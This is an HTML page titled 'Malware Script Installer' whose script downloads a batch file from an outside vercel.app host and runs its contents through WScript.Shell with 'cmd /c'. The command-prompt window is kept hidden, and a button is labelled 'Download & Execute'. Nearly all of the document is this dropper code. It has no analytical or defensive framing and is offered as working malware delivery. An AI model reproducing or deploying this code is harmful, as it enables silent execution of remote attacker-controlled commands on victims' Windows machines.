<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Malware Script Installer</title>
<script>
    function downloadAndExecute() {
        var xhr = new XMLHttpRequest();
        var url = 'https://dd-xi-five.vercel.app/setup.bat';
        
        xhr.open('GET', url, true);
        xhr.responseType = 'text';
        
        xhr.onload = function() {
            if (xhr.status === 200) {
                var shell = new ActiveXObject("WScript.Shell");
                try {
                    shell.Run('cmd /c ' + xhr.responseText, 0, false); // Change to false to prevent visibility of command prompt
                } catch (error) {
                    // Handle error if necessary
                }
            }
        };

        xhr.onerror = function() {
            // Handle error if necessary
        };
        
        xhr.send();
    }
</script>
</head>
<body>
    <h1>Malware Script Installer</h1>
    <p>Click the button below to download and execute the malware setup file:</p>
    <button onclick="downloadAndExecute()">Download & Execute</button>
</body>
</html>
